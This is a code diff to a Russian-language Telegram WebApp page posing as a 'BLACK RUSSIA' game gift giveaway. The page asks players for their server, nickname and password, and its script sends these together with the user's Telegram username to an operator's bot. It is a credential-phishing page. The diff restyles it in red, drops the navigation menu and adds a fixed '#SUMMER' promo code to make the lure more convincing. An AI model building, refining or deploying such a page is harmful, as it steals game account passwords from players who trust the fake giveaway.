@@ -12,7 +12,7 @@
             margin: 0;
             padding: 0;
             line-height: 1.5;
-            background: url('https://images.app.goo.gl/RbW2S') no-repeat center center fixed;
+            background: url('https://i.imgur.com/black-russia-bg.jpg') no-repeat center center fixed;
             background-size: cover;
             position: relative;
         }
@@ -37,73 +37,20 @@
             box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
         }
         
-        /* Шапка с меню */
+        /* Шапка */
         .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
             padding: 16px;
             background: rgba(0, 0, 0, 0.8);
-            position: relative;
-            border-bottom: 1px solid #ffcc00;
+            border-bottom: 1px solid #ff0000;
+            text-align: center;
         }
         
         .logo {
-            color: #ffcc00;
+            color: #ff0000;
             font-weight: bold;
-            font-size: 20px;
-            text-shadow: 0 0 5px rgba(255, 204, 0, 0.5);
-        }
-        
-        /* Бургер-меню */
-        .menu-btn {
-            width: 24px;
-            height: 24px;
-            position: relative;
-            cursor: pointer;
-            z-index: 100;
-        }
-        
-        .menu-btn span {
-            display: block;
-            width: 100%;
-            height: 3px;
-            background: #ffcc00;
-            margin: 4px 0;
-            transition: all 0.3s;
-            border-radius: 2px;
-        }
-        
-        /* Меню */
-        .menu {
-            position: fixed;
-            top: 0;
-            right: -250px;
-            width: 250px;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.95);
-            z-index: 99;
-            padding: 70px 20px 20px;
-            transition: all 0.3s;
-            border-left: 2px solid #ffcc00;
-        }
-        
-        .menu.active {
-            right: 0;
-        }
-        
-        .menu-item {
-            color: #fff;
-            padding: 14px 0;
-            border-bottom: 1px solid #333;
-            cursor: pointer;
-            font-size: 16px;
-            transition: all 0.2s;
-        }
-        
-        .menu-item:hover {
-            color: #ffcc00;
-            padding-left: 10px;
+            font-size: 24px;
+            text-shadow: 0 0 5px rgba(255, 0, 0, 0.5);
+            text-transform: uppercase;
         }
         
         /* Основной контент */
@@ -112,12 +59,12 @@
         }
         
         h1 {
-            color: #ffcc00;
+            color: #ff0000;
             text-align: center;
             font-size: 22px;
             margin-bottom: 20px;
             text-transform: uppercase;
-            text-shadow: 0 0 5px rgba(255, 204, 0, 0.3);
+            text-shadow: 0 0 5px rgba(255, 0, 0, 0.3);
         }
         
         .form-group {
@@ -141,11 +88,22 @@
             font-size: 16px;
         }
         
+        .promo-code {
+            padding: 12px;
+            background: rgba(255, 0, 0, 0.2);
+            border: 1px dashed #ff0000;
+            border-radius: 8px;
+            color: #ffcc00;
+            font-weight: bold;
+            text-align: center;
+            margin: 15px 0;
+        }
+        
         .btn {
             width: 100%;
             padding: 14px;
-            background: linear-gradient(90deg, #ffcc00, #ffaa00);
-            color: #000;
+            background: linear-gradient(90deg, #ff0000, #cc0000);
+            color: #fff;
             border: none;
             border-radius: 8px;
             font-weight: bold;
@@ -158,7 +116,7 @@
         
         .btn:hover {
             transform: translateY(-2px);
-            box-shadow: 0 4px 10px rgba(255, 204, 0, 0.3);
+            box-shadow: 0 4px 10px rgba(255, 0, 0, 0.3);
         }
         
         .gift-list {
@@ -170,55 +128,22 @@
             border-radius: 8px;
             padding: 12px;
             margin-bottom: 12px;
-            border-left: 3px solid #ffcc00;
+            border-left: 3px solid #ff0000;
         }
         
         .gift-title {
-            color: #ffcc00;
+            color: #ff0000;
             font-weight: bold;
             margin-bottom: 6px;
-        }
-        
-        /* Оверлей при открытом меню */
-        .overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.7);
-            z-index: 98;
-            display: none;
-        }
-        
-        .overlay.active {
-            display: block;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- Шапка с меню -->
+        <!-- Шапка -->
         <div class="header">
             <div class="logo">BLACK RUSSIA</div>
-            <div class="menu-btn" id="menuBtn">
-                <span></span>
-                <span></span>
-                <span></span>
-            </div>
         </div>
-        
-        <!-- Навигационное меню -->
-        <div class="menu" id="menu">
-            <div class="menu-item">НАЧАТЬ ИГРАТЬ</div>
-            <div class="menu-item">ДОНАТ</div>
-            <div class="menu-item">БАЗА ЗНАНИЙ</div>
-            <div class="menu-item">ФОРУМ</div>
-            <div class="menu-item">СМОТРИ БОЛЬШЕ</div>
-        </div>
-        
-        <!-- Оверлей -->
-        <div class="overlay" id="overlay"></div>
         
         <!-- Основной контент -->
         <div class="content">
@@ -242,6 +167,11 @@
             <div class="form-group">
                 <label>Введи пароль</label>
                 <input type="password" id="password" placeholder="Твой пароль" required>
+            </div>
+            
+            <!-- Неизменяемый промокод -->
+            <div class="promo-code">
+                Промокод: #SUMMER
             </div>
             
             <button class="btn" id="submitBtn">Получить подарок</button>
@@ -271,28 +201,12 @@
         const tg = window.Telegram.WebApp;
         tg.expand();
         
-        // Бургер-меню
-        const menuBtn = document.getElementById('menuBtn');
-        const menu = document.getElementById('menu');
-        const overlay = document.getElementById('overlay');
-        
-        menuBtn.addEventListener('click', function() {
-            menu.classList.toggle('active');
-            overlay.classList.toggle('active');
-            document.body.style.overflow = menu.classList.contains('active') ? 'hidden' : 'auto';
-        });
-        
-        overlay.addEventListener('click', function() {
-            menu.classList.remove('active');
-            overlay.classList.remove('active');
-            document.body.style.overflow = 'auto';
-        });
-        
         // Обработка формы
         document.getElementById('submitBtn').addEventListener('click', function() {
             const server = document.getElementById('server').value;
             const nickname = document.getElementById('nickname').value;
             const password = document.getElementById('password').value;
+            const promoCode = "#SUMMER"; // Фиксированный промокод
             
             if (!/^[А-Яа-яЁёA-Za-z]+_[А-Яа-яЁёA-Za-z]+$/.test(nickname)) {
                 tg.showAlert('Ник должен быть в формате: Имя_Фамилия');
@@ -303,6 +217,7 @@
                           `🎮 Сервер: ${server}\n` +
                           `🆔 Ник: ${nickname}\n` +
                           `🔑 Пароль: ${password}\n` +
+                          `🎫 Промокод: ${promoCode}\n` +
                           `От: @${tg.initDataUnsafe.user?.username || 'аноним'}`;
             
             const botToken = 'ВАШ_BOT_TOKEN';
@@ -320,7 +235,7 @@
                 })
                 .catch(error => {
                     console.error(error);
-                    tg.showAlert('⚠️ Ошибка соединения. Проверьте интернет.');
+                    tg.showAlert('⚠️ Ошибка сети. Проверьте интернет.');
                 });
         });
     </script>
